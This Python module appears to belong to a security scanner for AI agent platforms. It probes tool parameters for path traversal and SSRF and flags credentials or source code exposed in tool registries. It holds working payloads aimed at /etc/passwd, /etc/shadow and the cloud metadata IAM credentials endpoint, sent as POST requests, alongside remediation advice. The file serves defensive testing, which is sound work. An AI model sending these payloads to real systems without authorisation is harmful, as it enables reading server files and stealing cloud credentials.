"""ASI02 — Tool Misuse & Exploitation: path traversal and SSRF via tool parameters."""
from __future__ import annotations

from .base import BaseModule
from ..core.models import AgentSurface, Finding, OWASPCategory, Severity
from ..platforms.base import BasePlatform

_PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    r"C:\Windows\win.ini",
    r"..\..\..\Windows\win.ini",
]
_PATH_TRAVERSAL_INDICATORS = ["root:", "daemon:", "[extensions]", "[fonts]", "nobody:"]

_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1:22",
]
_SSRF_CONFIRMED_INDICATORS = ["ami-id", "instance-id", "ssh-", "OpenSSH", "iam/"]

# Fields in tool schemas that accept path or URL inputs
_PATH_FIELDS = {"path", "filepath", "file", "filename", "dir", "directory"}
_URL_FIELDS  = {"url", "endpoint", "uri", "webhook", "target"}

# Credential fields that should not have non-empty values exposed
_CRED_FIELDS = {"apiKey", "apikey", "api_key", "token", "password", "secret", "credential", "key"}

# Generic probe endpoints — used when surface has no tools
_GENERIC_ENDPOINTS = [
    "/api/v1/tools/execute",
    "/api/v1/node-load-method/calculator",
]


def _tool_name(tool: dict) -> str:
    return tool.get("name") or tool.get("id") or "unknown"


def _schema_fields(tool: dict) -> set[str]:
    """Extract field names from tool inputParams or schema.properties."""
    fields: set[str] = set()
    # Flowise inputParams style: list of {name, type, ...}
    params = tool.get("inputParams") or []
    if isinstance(params, list):
        for p in params:
            if isinstance(p, dict) and p.get("name"):
                fields.add(p["name"].lower())
    # JSON schema style
    props = (tool.get("schema") or {}).get("properties") or {}
    if isinstance(props, dict):
        fields.update(k.lower() for k in props)
    return fields


class ToolMisuseModule(BaseModule):
    name        = "tool-misuse"
    owasp_id    = OWASPCategory.ASI02
    description = "Tests for path traversal and SSRF via tool parameters, and detects exposed credentials (ASI02)"

    async def run(self, surface: AgentSurface, platform: BasePlatform) -> list[Finding]:
        findings: list[Finding] = []

        # --- 3. Tool enumeration exposure (runs regardless of auth) ---
        for tool in surface.tools:
            tool_name = _tool_name(tool)

            # Source code exposure
            func_code = tool.get("func") or tool.get("function") or ""
            if func_code and len(str(func_code)) > 20:
                findings.append(Finding(
                    title=f"Tool source code exposed: {tool_name}",
                    severity=Severity.HIGH,
                    owasp_id=self.owasp_id,
                    description=(
                        f"The tool '{tool_name}' exposes its source code in the tool registry. "
                        f"An attacker can read business logic, discover hardcoded secrets, "
                        f"or craft targeted exploits against the tool's implementation."
                    ),
                    evidence=f"Tool '{tool_name}' has 'func' field with {len(str(func_code))} chars of code.",
                    remediation="Do not expose tool source code via the API. Return only metadata.",
                    confidence=90,
                    endpoint="/api/v1/tools",
                ))

            # Credential exposure in tool config
            for field in _CRED_FIELDS:
                val = tool.get(field) or (tool.get("config") or {}).get(field) or ""
                if val and isinstance(val, str) and len(val) > 3:
                    findings.append(Finding(
                        title=f"Credential exposed in tool configuration: {tool_name}.{field}",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The tool '{tool_name}' exposes a non-empty '{field}' field in its "
                            f"configuration via the unauthenticated tool registry. "
                            f"An attacker can harvest API keys or secrets without authentication."
                        ),
                        evidence=f"Tool '{tool_name}' field '{field}' = '{val[:8]}...' (truncated)",
                        remediation=(
                            "Never return credential fields in API responses. "
                            "Mask or omit sensitive fields before serialization."
                        ),
                        confidence=95,
                        endpoint="/api/v1/tools",
                    ))

        # --- 1 & 2. Path traversal and SSRF via tool invocation (cap at 5 tools) ---
        for tool in surface.tools[:5]:
            tool_name = _tool_name(tool)
            fields = _schema_fields(tool)

            # Path traversal
            if fields & _PATH_FIELDS:
                endpoint = f"/api/v1/node-load-method/{tool_name}"
                for payload in _PATH_TRAVERSAL_PAYLOADS:
                    try:
                        r = await platform.post(endpoint, json={"filePath": payload, "path": payload})
                        if r.status_code == 200:
                            body = r.text
                            confirmed = any(ind in body for ind in _PATH_TRAVERSAL_INDICATORS)
                            if confirmed:
                                findings.append(Finding(
                                    title=f"Path traversal via tool parameter: {tool_name}",
                                    severity=Severity.CRITICAL,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' accepts a file path parameter and "
                                        f"returned OS file content when given a traversal payload. "
                                        f"An attacker can read arbitrary files from the server."
                                    ),
                                    evidence=f"POST {endpoint} with path='{payload}' → OS file content in response: {body[:200]}",
                                    remediation=(
                                        "Validate and sanitize all file path inputs. "
                                        "Use an allowlist of permitted directories. "
                                        "Run the tool execution process with minimal filesystem permissions."
                                    ),
                                    confidence=95,
                                    endpoint=endpoint,
                                ))
                                break
                    except Exception:
                        pass

            # SSRF via URL parameter
            if fields & _URL_FIELDS:
                endpoint = f"/api/v1/node-load-method/{tool_name}"
                for ssrf_url in _SSRF_PAYLOADS:
                    try:
                        r = await platform.post(endpoint, json={"url": ssrf_url, "endpoint": ssrf_url})
                        if r.status_code == 200:
                            body = r.text
                            confirmed = any(ind in body for ind in _SSRF_CONFIRMED_INDICATORS)
                            if confirmed:
                                findings.append(Finding(
                                    title=f"SSRF via tool URL parameter: {tool_name}",
                                    severity=Severity.CRITICAL,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' fetched an SSRF payload URL and "
                                        f"returned cloud metadata in its response. "
                                        f"An attacker can access instance metadata, internal services, "
                                        f"or IAM credentials."
                                    ),
                                    evidence=f"POST {endpoint} with url='{ssrf_url}' → metadata in response: {body[:200]}",
                                    remediation=(
                                        "Validate all URL inputs against an allowlist of permitted hosts. "
                                        "Block requests to RFC-1918 and link-local address ranges. "
                                        "Use a dedicated egress proxy with SSRF protections."
                                    ),
                                    confidence=95,
                                    endpoint=endpoint,
                                ))
                                break
                            elif len(body) > 10:
                                findings.append(Finding(
                                    title=f"Potential SSRF — tool accepts arbitrary URLs: {tool_name}",
                                    severity=Severity.MEDIUM,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' returned a non-empty response when "
                                        f"given an SSRF payload URL. Full exploitation requires manual verification."
                                    ),
                                    evidence=f"POST {endpoint} with url='{ssrf_url}' → 200 OK, {len(body)} bytes",
                                    remediation=(
                                        "Validate and restrict outbound URL targets. "
                                        "Block requests to internal IP ranges."
                                    ),
                                    confidence=60,
                                    endpoint=endpoint,
                                ))
                                break
                    except Exception:
                        pass

        # --- 4. Generic probe when no tools enumerated ---
        if not surface.tools:
            for endpoint in _GENERIC_ENDPOINTS:
                try:
                    r = await platform.post(endpoint, json={"name": "calculator", "input": "1+1", "expression": "1+1"})
                    if r.status_code == 200:
                        findings.append(Finding(
                            title=f"Tool execution endpoint reachable without authentication: {endpoint}",
                            severity=Severity.LOW,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The endpoint {endpoint} responded to an unauthenticated tool "
                                f"execution request. This may allow arbitrary tool invocation."
                            ),
                            evidence=f"POST {endpoint} → 200 OK",
                            remediation="Require authentication on all tool execution endpoints.",
                            confidence=60,
                            endpoint=endpoint,
                        ))
                except Exception:
                    pass

        return findings
